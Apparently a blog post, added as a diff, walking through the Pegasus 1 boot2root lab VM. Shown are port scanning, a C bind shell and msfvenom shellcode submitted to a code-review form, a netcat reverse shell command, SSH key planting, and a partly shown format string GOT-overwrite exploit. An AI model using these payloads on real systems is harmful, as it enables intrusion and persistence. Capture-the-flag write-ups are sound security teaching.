@@ -1,0 +1,945 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>hoof to root ? - solving pegasus 1 &middot; </title>
+
+  
+  <link rel="stylesheet" href="https://leonjza.github.io/css/poole.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/poole-overrides.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-overrides.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-x.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/highlight/solarized_light.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://leonjza.github.io/touch-icon-144-precomposed.png">
+  <link href="https://leonjza.github.io/favicon.png" rel="icon">
+
+  
+  
+  
+  
+
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  
+</head>
+<body class="theme-base-0d">
+<div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      
+        <img src="https://www.gravatar.com/avatar/28d2f6c24dad39f38af0272dfc0da953?s=200"
+             alt="gravatar" title="">
+      
+      <h1></h1>
+      <p class="lead">#!/slash/note<br />
+<em>A checkbox unchecker&rsquo;s notepad</em></p>
+    </div>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/">Home</a></li>
+      
+      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/about/">About</a></li>
+      
+    </ul>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item">
+      <a href="https://github.com/leonjza"><i class="fa fa-github-square fa-3x"></i></a>
+      
+      
+      
+      
+      
+      <a href="https://twitter.com/leonjza"><i class="fa fa-twitter-square fa-3x"></i></a>
+      
+      
+      </li>
+    </ul>
+
+    
+
+    <p>Copyright &copy; 2016 <a href="https://leonjza.github.io/license/">License</a><br/>
+       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
+  </div>
+</div>
+
+
+<div class="content container">
+  <div class="post">
+    <h1>hoof to root ? - solving pegasus 1</h1>
+    <span class="post-date">Dec 23, 2014 &middot; 21 minute read &middot; <a href="https://leonjza.github.io/blog/2014/12/23/hoof-to-root----solving-pegasus-1/#disqus_thread">Comments</a>
+    
+    <br/>
+    <a class="label" href="https://leonjza.github.io/categories/ctf">CTF</a><a class="label" href="https://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a><a class="label" href="https://leonjza.github.io/categories/solution">Solution</a><a class="label" href="https://leonjza.github.io/categories/challenge">Challenge</a><a class="label" href="https://leonjza.github.io/categories/vulnhub">VulnHub</a>
+    </span>
+    
+
+<h2 id="introduction:2909c52a557f765558fa015a0dc1703a">introduction</h2>
+
+<p><a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus 1</a> is a boot2root hosted on <a href="https://www.vulnhub.com/">VulnHub</a> built by <a href="https://twitter.com/theknapsy">@TheKnapsy</a>. He wrote a <a href="http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/">blogpost</a> about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).</p>
+
+
+<figure >
+    
+        <img src="https://leonjza.github.io/images/pegasus_logo.png" />
+    
+    
+</figure>
+
+
+<p>Having recently played in the <a href="https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/">Offsec Playground</a> a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&hellip; <em>again</em>. You will see this in the <strong>my_first</strong> section.</p>
+
+<p>Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!</p>
+
+<p>Lets begin.</p>
+
+<h2 id="nmap-again:2909c52a557f765558fa015a0dc1703a">nmap, again</h2>
+
+<p>Starting a VM like this, you should almost have a knee-jerk reaction to reach for nmap as your first tool to use. A VM, hosted on the network, means you will probably be attacking this one&hellip; via the network. So after figuring out what the IP address is (via arp, netdiscover etc.), I threw nmap at it:</p>
+
+<pre><code class="language-bash">root@kali:~# nmap --reason -sV 192.168.56.101 -p-
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-23 09:16 SAST
+Nmap scan report for 192.168.56.101
+Host is up, received arp-response (0.00022s latency).
+Not shown: 65531 closed ports
+Reason: 65531 resets
+PORT      STATE SERVICE REASON  VERSION
+22/tcp    open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
+8088/tcp  open  http    syn-ack nginx 1.1.19
+55625/tcp open  status  syn-ack 1 (RPC #100024)
+MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds
+</code></pre>
+
+<p><code>tcp/22</code>, <code>tcp/111</code>, <code>tcp/8088</code> and <code>tcp/55625</code>. Thats quite a bit to work with already. I decided to dive right into the web server that appears to be running on <code>tcp/8088</code>.</p>
+
+<h2 id="stomping-some-hoofs-with-pegasus:2909c52a557f765558fa015a0dc1703a">stomping some hoofs with pegasus</h2>
+
+<p>Browsing to <a href="http://192.168.56.101:8088/">http://192.168.56.101:8088/</a>, we are presented with a picture of Pegasus:</p>
+
+
+<figure >
+    
+        <img src="https://leonjza.github.io/images/pegasus_web.png" />
+    
+    
+</figure>
+
+
+<p>I manually tried to browse to things like <code>robots.txt</code> etc, but everything responded with the same image. This was until I decided to browse to <code>index.php</code>, in an attempt to check that the web server is configured to serve PHP content:</p>
+
+
+<figure >
+    
+        <img src="https://leonjza.github.io/images/pegasus_nginx_index.png" />
+    
+    
+</figure>
+
+
+<p>So this doesn’t exactly tell us PHP is supported yet, but it does get us somewhere if we wanted to brute force the web server in search of content. Inspecting the headers of the HTTP responses thus far, we would see that everything would return HTTP 200, however, <code>.php</code> scripts would 404 correctly. With that in mind, it was time to reach for <code>wfuzz</code> to discover some more.</p>
+
+<pre><code class="language-bash">root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc 404 http://192.168.56.101:8088/FUZZ.php
+
+********************************************************
+* Wfuzz  2.0 - The Web Bruteforcer                     *
+********************************************************
+
+Target: http://192.168.56.101:8088/FUZZ.php
+Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt
+
+Total requests: 1660
+==================================================================
+ID  Response   Lines      Word         Chars          Request
+==================================================================
+
+01426:  C=200      0 L         4 W       19 Ch    &quot; - submit&quot;
+</code></pre>
+
+<p>And we have a HTTP 200 response for <code>submit.php</code>. So, I browsed to <a href="http://192.168.56.101:8088/submit.php:">http://192.168.56.101:8088/submit.php:</a></p>
+
+
+<figure >
+    
+        <img src="https://leonjza.github.io/images/pegasus_submit.png" />
+    
+    
+</figure>
+
+
+<p>Well that isn&rsquo;t exactly useful. I played a little with the <code>submit.php</code> by sending a POST with some <code>--data</code>, but nothing useful came of it. Almost everything came back with <code>No data to process</code>.</p>
+
+<p>Admittedly, this was my first hurdle. I was thinking if there is a <code>submit.php</code>, surely there is something that actually submits the appropriate data to it? So I pulled out some more wordlists and fed them to wfuzz to work on. I&rsquo;ll be honest, I did not like this part much. The wordlists were just too big and it almost felt like this is probably not the way to go about this. <code>wfuzz</code> was working with <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>, when finally I get a HTTP 200 for <code>codereview.php</code>.</p>
+
+
+<figure >
+    
+        <img src="https://leonjza.github.io/images/pegasus_code_review.png" />
+    
+    
+</figure>
+
+
+<h2 id="pwning-mike:2909c52a557f765558fa015a0dc1703a">pwning mike</h2>
+
+<p>So mike is apparently a trainee code reviewer. We have a form where we can submit code for him to check out. This is the form that submits the POST data <code>code</code> to the previously found <code>submit.php</code>.</p>
+
+<p>Ok. Well this is a interesting one. My initial thoughts were that if Mike was checking out code, he is possibly executing it? There was however no hint on what language he is expecting, so the wild goose chase began.</p>
+
+<p>PHP, Python, Perl, Ruby, Bash. Name them. I tried them all. Ok maybe not all, especially not brainfk. :D However, in all of them, I tried to get the language to execute <code>/bin/nc 192.168.56.102 4444 -e /bin/sh</code> or variants thereof so that it would connect to my netcat listener on my Kali machine, and spawn me a shell.</p>
+
+<p>Eventually, I came to try some C. Admittedly, I was starting to rethink my strategy by now. That was until my C source had a call to <code>system()</code> in it:</p>
+
+
+<figure >
+    
+        <img src="https://leonjza.github.io/images/pegasus_code_review_security.png" />
+    
+    
+</figure>
+
+
+<p>Ooooooh. Ok so that was a very obvious hint that I was getting closer. For me, this boiled down to it either accepting PHP due to <a href="http://php.net/manual/en/function.system.php">system</a>, or C due to its <a href="http://linux.die.net/man/3/system">system</a>. Obviously though, <code>system()</code> is being filtered out, so I would need an alternative.</p>
+
+<p><em>insert fade to black</em></p>
+
+<p><em>CAPTION: many hours later</em></p>
+
+<p>After exhausting my PHP attempts, it was time to move to C. My first attempt was was something along the lines of</p>
+
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+
+// msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c
+unsigned char buf[] =
+&quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&quot;
+&quot;\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a&quot;
+&quot;\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0&quot;
+&quot;\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f&quot;
+&quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0&quot;
+&quot;\x0b\xcd\x80&quot;;
+
+int main()
+{
+    int (*ret)() = (int(*)())buf;
+    ret();
+}
+</code></pre>
+
+<p>This was supposed to open me a <code>tcp/4444</code> shell, but to no avail. Infact, no shellcode related execution appeared to do anything. As a last resort before I figured I&rsquo;d need to get me some hints, I searched for some non-shellcode type bind shell generation C source. Unfortunately, I don’t write C socket software out of my head, but luckily Google came to the rescue and landed me on <a href="http://bigpointyteeth.se/code/bindshell.c">this</a>. I modified the code slightly by hardcoding my desired port and shell, and submitted it to be &lsquo;reviewed&rsquo;:</p>
+
+<pre><code class="language-c">// Source: http://webcache.googleusercontent.com/search?q=cache:52EC4LfMJX4J:bigpointyteeth.se/code/bindshell.c+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=za
+// http://bigpointyteeth.se/code/bindshell.c
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+
+#define SHELL &quot;/bin/sh&quot;   // shell to execute
+#define NAME &quot;rsync&quot;        // name of the forked bindshell shown in ps
+
+int main(int argc, char *argv[]) {
+    char msg[16];
+    int srv_sockfd, new_sockfd;
+    socklen_t new_addrlen;
+    struct sockaddr_in srv_addr, new_addr;
+
+    // fork into background
+    if (fork() == 0) {
+        if ((srv_sockfd = socket(PF_INET, SOCK_STREAM, 0)) &lt; 0) {
+            return -1;
+        }
+
+        srv_addr.sin_family = PF_INET;
+        srv_addr.sin_port = htons(atoi(&quot;4444&quot;));
+        srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+
+        if (bind(srv_sockfd, (struct sockaddr *)&amp;srv_addr, sizeof(srv_addr)) &lt; 0) {
+            return -1;
+        }
+
+        if (listen(srv_sockfd, 1) &lt; 0) {
+            return -1;
+        }
+
+        // accept loop
+        for (;;) {
+            new_addrlen = sizeof(new_addr);
+            new_sockfd = accept(srv_sockfd, (struct sockaddr *)&amp;new_addr, &amp;new_addrlen);
+            if (new_sockfd &lt; 0) {
+                return -1;
+            }
+
+            // fork to handle new connection
+            if (fork() == 0) {
+                // close old listener
+                close(srv_sockfd);
+                // print the parent pid which should be killed in order
+                // to remove the persistant bindshell listener
+                sprintf(msg, &quot;ppid=%d\n&quot;, getppid());
+                write(new_sockfd, msg, strlen(msg));
+
+                dup2(new_sockfd, 2);
+                dup2(new_sockfd, 1);
+                dup2(new_sockfd, 0);
+
+                execl(SHELL, NAME, NULL);
+                return 0;
+            }
+            else
+                close(new_sockfd);
+        } // end accept loop
+    } // end fork into background
+    return 0;
+}
+</code></pre>
+
+<p>All of my attempts were followed by a nmap on <code>tcp/4444</code> to see if the shell has become available. After submitting the above code, we got a new port open (this Mike guy is pretty fast you should hire him!):</p>
+
+<pre><code class="language-bash">root@kali:~# nmap 192.168.56.101 -p 4444
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-23 11:33 SAST
+Nmap scan report for 192.168.56.101
+Host is up (0.00034s latency).
+PORT     STATE SERVICE
+4444/tcp open  krb524
+MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
+</code></pre>
+
+<p>Awesome, so lets connect and see what we have:</p>
+
+<pre><code class="language-bash">root@kali:~# nc -v 192.168.56.101 4444
+192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
+(UNKNOWN) [192.168.56.101] 4444 (?) open
+ppid=10450
+id
+uid=1001(mike) gid=1001(mike) groups=1001(mike)
+</code></pre>
+
+<p>As was hoped for, a shell as <code>mike</code>. I quickly generated a new ssh key pair for Pegasus, and cat the public key to <code>mike</code>&rsquo;s <code>authorized_keys</code> file and went on to SSH in as mike:</p>
+
+<pre><code class="language-bash"># first I cat the public key so that I can copy it
+root@kali:~# cat pegasus.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R root@kali
+
+# next I connect to the bind shell listener and move to Mikes .shh directory
+root@kali:~# nc -v 192.168.56.101 4444
+192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
+(UNKNOWN) [192.168.56.101] 4444 (?) open
+ppid=10450
+cd .ssh
+
+# next we append my public key to mikes authorized_keys
+echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R&quot; &gt;&gt; authorized_keys
+ls -lh
+total 12K
+-rw-rw-r-- 1 mike mike  381 Dec 23 20:36 authorized_keys
+-rw------- 1 mike mike 1.7K Nov 18 12:39 id_rsa
+-rw-r--r-- 1 mike mike  222 Nov 18 17:39 known_hosts
+chmod 600 authorized_keys
+^C
+
+# with the authorized_keys ready, I SSH in as mike using my key pair
+root@kali:~# ssh mike@192.168.56.101 -i pegasus
+Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-39-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Tue Dec 23 20:36:47 AEDT 2014
+
+  System load:  0.0               Processes:           93
+  Usage of /:   6.8% of 18.32GB   Users logged in:     0
+  Memory usage: 12%               IP address for eth0: 192.168.56.101
+  Swap usage:   0%
+
+  =&gt; There are 2 zombie processes.
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+
+Your Hardware Enablement Stack (HWE) is supported until April 2017.
+
+You have mail.
+Last login: Tue Dec 16 19:27:53 2014 from 172.16.246.129
+mike@pegasus:~$
+</code></pre>
+
+<h2 id="my-first-your-first-we-all-first:2909c52a557f765558fa015a0dc1703a">my_first, your_first, we_all_first</h2>
+
+<p>With my initial shell I was able to start enumerating Pegasus a little more. The most obvious next step was the SUID binary in <code>mike</code>&rsquo;s home (we will get to it shortly):</p>
+
+<pre><code class="language-bash">mike@pegasus:~$ ls -lh
+total 16K
+-rwxr-xr-x 1 mike mike  845 Nov 18 20:52 check_code.sh
+drwx------ 2 mike mike 4.0K Nov 18 17:49 Mail
+-rwsr-xr-x 1 john john 6.5K Nov 28 10:26 my_first
+</code></pre>
+
+<p>More enumeration revealed that <code>/opt/</code> had a number of interesting parts to it as well:</p>
+
+<pre><code class="language-bash">mike@pegasus:~$ ls -lh /opt/
+total 12K
+drwxrwxrwx 2 root root 4.0K Dec 23 20:33 code_review
+drwxr-xr-x 3 root root 4.0K Nov 25 04:38 git
+drwxr-xr-x 2 root root 4.0K Nov 18 14:43 nfs
+</code></pre>
+
+<p>Piecing the web interface together, you will see that the submitted source is put into <code>code.c</code> in <code>/opt/code_review/</code>, and then compiled from the script in <code>/home/mike/check_code.sh</code> and eventually executed.</p>
+
+<p>The <code>/opt/git/</code> folder had what looked like remnants of the typical <code>.git/</code> folders when you checkout code from a repo, but not the actual files itself. I poked around a bit, and was able to re-assemble the <code>main.c</code> file from the git history.</p>
+
+<h3 id="rebuilding-main-c:2909c52a557f765558fa015a0dc1703a">rebuilding main.c</h3>
+
+<p><em>This step is not essential in progressing with Pegasus, but I figured it would be an interesting approach nonetheless</em></p>
+
+<p>Even though the git folder did not appear to have any actual source files, one could quickly learn what it contains. For example, the git log will show you the commit history:</p>
+
+<pre><code class="language-bash">mike@pegasus:/opt/git/my_first.git$ git log
+commit 85365946a8142c52ee6040a029dd069b514c2ab0
+Author: Mike Ross &lt;mike@pegasus.(none)&gt;
+Date:   Tue Nov 25 04:48:01 2014 +1100
+
+    Committing some security fixes
+
+commit 0a8af1ed956518ec078b152ad7571105e2df26c6
+Author: John Wall &lt;john@pegasus.(none)&gt;
+Date:   Tue Nov 25 04:39:42 2014 +1100
+
+    initial commit
+</code></pre>
+
+<p>From the log we can see that there as an initial commit, and one more after that with some <em>security fixes</em>. Chances are, if we can see what the initial commit was then we can see the full initial code. So, lets check out the details of commit <em>0a8af1ed</em>:</p>
+
+<pre><code class="language-diff">mike@pegasus:/opt/git/my_first.git$ git show 0a8af1ed
+commit 0a8af1ed956518ec078b152ad7571105e2df26c6
+Author: John Wall &lt;john@pegasus.(none)&gt;
+Date:   Tue Nov 25 04:39:42 2014 +1100
+
+    initial commit
+
+diff --git a/main.c b/main.c
+new file mode 100644
+index 0000000..39c0182
+--- /dev/null
++++ b/main.c
+@@ -0,0 +1,133 @@
++#include &lt;stdio.h&gt;
++#include &lt;stdlib.h&gt;
++
++int calculator();
++int string_replay();
++int string_reverse();
++int quit();
++
++int main()
++{
++    char selection[5];
++    int sel;
++    char * err_check;
+
+[... snip ...]
+</code></pre>
+
+<p>Nice! We have a file <code>main.c</code> that was added. I copied the diff and saved it to <code>init.patch</code>, and then ran the patch:</p>
+
+<pre><code class="language-bash">root@kali:~# patch -p1 &lt; init.diff
+patching file main.c
+</code></pre>
+
+<p>That gives us the state of files after commit <em>0a8af1ed</em> which was labeled as the initial commit. The same process was followed for the next commit <em>85365946a8</em> which apparently included some <em>security fixes</em>. Copy the diff, make the .patch file and apply it. After this process, we have the sources up to where the git commit history has it.</p>
+
+<p>I inspected that code before and after the security fixes commit, and noticed that the security fixes fixed a potential format string vulnerability. At least, that was the one my untrained eye was able to spot:</p>
+
+<pre><code class="language-diff">diff --git a/main.c b/main.c
+index 39c0182..b6b2ed4 100644
+--- a/main.c
++++ b/main.c
+@@ -8,7 +8,7 @@ int quit();
+
+[... snip ...]
++
+         printf(&quot;Enter second number: &quot;);
+         if (fgets(numberB, sizeof numberB, stdin) != NULL)
+         {
+-            int numA = strtol(numberA, &amp;err_check, 10);
+             int numB = strtol(numberB, &amp;err_check, 10);
+             if (*err_check != '\n')
+             {
+-                printf(&quot;Error details: &quot;);
+-                printf(err_check);
++                printf(&quot;Error details: %s&quot;, err_check);
+                 printf(&quot;\n&quot;);
+                 return 1;
+[... snip ...]
+</code></pre>
+
+<p><code>printf(err_check);</code> is the potentially vulnerable call&hellip; I think.</p>
+
+<h3 id="the-calculator-with-a-hole:2909c52a557f765558fa015a0dc1703a">the calculator with a hole</h3>
+
+<p>After toying with the git repository, my attention turned back to the SUID binary. When I run <code>my_first</code>, I am actually running it as <code>john</code>. This means, should I be able to exploit it and do things other than what its intended for, I may affectively gain <code>john</code>&rsquo;s privileges! Sounds easy right. :P</p>
+
+<p>I quickly realized that the <code>main.c</code> file I got out of the git repository, was the sources for the <code>my_first</code> binary. So, my focus shifted to the piece of code I saw the security fix for.</p>
+
+<p>First, it was time to confirm my suspicion of a format string vulnerability:</p>
+
+<pre><code class="language-bash">mike@pegasus:~$ ./my_first
+WELCOME TO MY FIRST TEST PROGRAM
+--------------------------------
+Select your tool:
+[1] Calculator
+[2] String replay
+[3] String reverse
+[4] Exit
+
+Selection: 1
+
+Enter first number: 1
+Enter second number: %x
+Error details: bf96cbec
+
+Selection:
+</code></pre>
+
+<p>I don’t like format string vulnerabilities. In fact not at all. I was hoping for something else and at this stage, I was happy I found the bug (which was the code before the security fixes btw), but sad that its a format string.</p>
+
+<p>Anyways, feels aside, it was time to work on a exploit.</p>
+
+<p>For the format string exploit, I don&rsquo;t think its really worth explaining all the details again. In fact, compiling this exploit, I was referring to a older blogpost about <a href="https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/">Xerxes2</a> which also had a similar thing going. Feel free to check the binary section out there if the next part does not make much sense.</p>
+
+<p><strong>EDIT</strong> I have since made a small asciinema showing the offset calculations on my Kali VM. Though the offsets are not the same the theory still applies. <script type="text/javascript" src="https://asciinema.org/a/14960.js" id="asciicast-14960" async data-theme="solarized-dark"></script></p>
+
+<h3 id="punching-more-than-numbers:2909c52a557f765558fa015a0dc1703a">punching more than numbers</h3>
+
+<p><em>So here, I had a pretty big freaking fail. A massive one. Once I had determined the stack position to start corrupting memory with, I was punching in the format strings in the application itself. Meaning, I was giving it the ASCII \x\x\x\x and not the actual bytes as would have been the case if I was using python/printf to redirect the stdout of them to <code>my_first</code>&rsquo;s stdin. Anyways, lessons were learnt, caffeine was injected. It wont happen again. Big up to <a href="https://twitter.com/barrebas">@barrebas</a> for subtly pointing the fail out ;p</em></p>
+
+<p>As I had seen the source code, it was easy to formulate a plan for the exploit. I would make use of a ret2libc attack by overriding the GOT entry for <code>printf()</code> using the format string to <code>system()</code> instead. This means, the next time <code>printf()</code> is called, it would actually execute <code>system()</code> with the adjacent argument on the stack. Lets see how this was done.</p>
+
+<h4 id="compiling-the-format-string:2909c52a557f765558fa015a0dc1703a">compiling the format string</h4>
+
+<p>We know that the 2nd number that the applications wants triggers our format string. So, lets prepare some skeleton input, piping it to the <code>./my_first</code> binary to sample a successful run:</p>
+
+<pre><code class="language-bash">mike@pegasus:~$ printf '1\n1\n1\n4\n' | ./my_first
+WELCOME TO MY FIRST TEST PROGRAM
+--------------------------------
+Select your tool:
+[1] Calculator
+[2] String replay
+[3] String reverse
+[4] Exit
+
+Selection:
+Enter first number: Enter second number: Result: 1 + 1 = 2
+
+Selection:
+Goodbye!
+</code></pre>
+
+<p>Cool, so we have sampled adding 1 to 1 ;p Now we can get to exploiting the format string. The first step we have is to determine which parameter on the stack we have control of. We determine this by providing it with a string of 4 A&rsquo;s, and then incrementing the format string arguments by 1 until we can find the 4 A&rsquo;s. In my case, I will be formatting them as hex with <code>%x</code>, so I am searching for <code>41414141</code>. The format string will therefore start as <code>AAAA.0x%s</code>. Note that in the below example we are using 2 x percentages (2 x &lsquo;%&rsquo;) as it needs to be escaped in the shell:</p>
+
+<pre><code class="language-bash">mike@pegasus:~$ printf '1\n1\nAAAA.0x%%x\n4\n' | ./my_first
+WELCOME TO MY FIRST TEST PROGRAM
+--------------------------------
+Select your tool:
+[1] Calculator
+[2] String replay
+[3] String reverse
+[4] Exit
+
+Selection:
+Enter first number: Enter second number: Error details: AAAA.0xbff5321c
+
+Selection:
+Goodbye!
+</code></pre>
+
+<p>And we have the output of <code>AAAA.0xbff5321c</code>. Yay :)
+Continuously incrementing this will eventually get you to argument 8, where you will find the clean string of hex A&rsquo;s:</p>
+
+<pre><code class="language-bash">mike@pegasus:~$ printf '1\n1\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\n4\n' | ./my_first
+WELCOME TO MY FIRST TEST PROGRAM
+--------------------------------
+Select your tool:
+[1] Calculator
+[2] String replay
+[3] String reverse
+[4] Exit
+
+Selection:
+Enter first number: Enter second number: Error details: AAAA.0xbfbd145c0xa0xb75b41600xb7726ac00xb7752ff40xb77539180xbfbd14600x41414141
+
+Selection:
+Goodbye!
+mike@pegasus:~$
+</code></pre>
+
+<p>So, using direct parameter access in the format string, we can reference parameter 8 directly:</p>
+
+<pre><code class="language-bash">mike@pegasus:~$ printf '1\n1\nAAAA.0x%%8$x\n4\n' | ./my_first
+WELCOME TO MY FIRST TEST PROGRAM
+--------------------------------
+Select your tool:
+[1] Calculator
+[2] String replay
+[3] String reverse
+[4] Exit
+
+Selection:
+Enter first number: Enter second number: Error details: AAAA.0x41414141
+
+Selection:
+Goodbye!
+mike@pegasus:~$
+</code></pre>
+
+<p>Parameter 8 in the format string is the start of the section on the stack we can read now, shown in the output <code>AAAA.0x41414141</code> of the format string <code>AAAA.0x%8$x</code>.</p>
+
+<p>Now we will move on to making use of the <code>%n</code> format string to write to a arbitrary area in memory. Where do we want to write? To the GOT where the lookup for <code>printf()</code> occurs ofc! Lets dump the GOT for <code>./my_first</code>, and determine where it will go look for <code>printf()</code>:</p>
+
+<pre><code class="language-bash">mike@pegasus:~$ objdump -R ./my_first
+
+./my_first:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049bec R_386_GLOB_DAT    __gmon_start__
+08049c20 R_386_COPY        stdin
+08049bfc R_386_JUMP_SLOT   printf
+08049c00 R_386_JUMP_SLOT   fgets
+08049c04 R_386_JUMP_SLOT   puts
+08049c08 R_386_JUMP_SLOT   __gmon_start__
+08049c0c R_386_JUMP_SLOT   __libc_start_main
+08049c10 R_386_JUMP_SLOT   putchar
+08049c14 R_386_JUMP_SLOT   strtol
+</code></pre>
+
+<p>The location of <code>printf()</code> will be looked up at <code>08049bfc</code>. This is the part where we want to rewrite the address of <code>printf()</code> to that of libc&rsquo;s <code>system()</code>.</p>
+
+<p>The last part we need is to know where <code>system()</code> actually is. An important vector that may influence this position in memory is known as ASLR, which will effectively cause the address of <code>system()</code> to be different every time <code>./my_first</code> is run. To combat this, a neat little trick to increase the stack size can be used using <code>ulimit</code>. <code>ulimit -s unlimited</code> will maximize the stack size, effectively causing the ASLR to be practically nonexistent:</p>
+
+<pre><code class="language-bash">mike@pegasus:~$ ulimit -s
+8192
+mike@pegasus:~$ ulimit -s unlimited
+mike@pegasus:~$ ulimit -s
+unlimited
+</code></pre>
+
+<p>With the ASLR problem out of the way, lets leak the address of <code>system()</code>:</p>
+
+<pre><code class="language-bash"># fire up gdb
+mike@pegasus:~$ gdb -q ./my_first
+Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.
+
+# set a break point as we enter main()
+(gdb) b main
+Breakpoint 1 at 0x804850f
+
+# run the binary
+(gdb) r
+Starting program: /home/mike/my_first
+
+Breakpoint 1, 0x0804850f in main ()
+
+# leak the current address of system()
+(gdb) p system
+$1 = {&lt;text variable, no debug info&gt;} 0x40069060 &lt;system&gt;
+(gdb)
+</code></pre>
+
+<p>And so we learn that <code>system()</code> lives at <code>0x40069060</code>. What does this all mean so far then? Well, we are now going to use the format string vulnerability to write (using <code>%n</code>) a new address for <code>printf()</code> in the GOT at <code>08049bfc</code> to point to <code>system()</code> at <code>0x40069060</code> instead of its real location.</p>
+
+<p>For us to debug the application while we prepare the required padding for the format string, we will use the <code>printf()</code> used to pipe to <code>./my_first</code> to redirect to a file instead. Then, in <code>gdb</code>, we will run the binary, redirecting the input from the file we will compile with the <code>printf()</code>:</p>
+
+<pre><code class="language-bash"># so, instead of the 4 x A's, we will now place the address
+# in the GOT that we want to override, and use the %x format
+# string to attempt writing to it
+mike@pegasus:~$ printf '1\n1\n\xfc\x9b\x04\x08%%8$n' &gt; t
